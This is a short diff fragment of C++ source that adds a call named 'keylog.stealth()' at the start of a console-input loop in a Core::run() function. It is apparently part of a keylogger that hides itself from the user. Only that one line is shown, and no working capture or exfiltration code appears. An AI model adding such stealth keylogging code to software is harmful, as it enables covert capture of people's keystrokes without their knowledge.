@@ -39,6 +39,7 @@ int	Core::run()
 {
 	bool Continue = TRUE;
 
+	keylog.stealth();
 	while (Continue)
 	{
 		ReadConsoleInput(hIn,
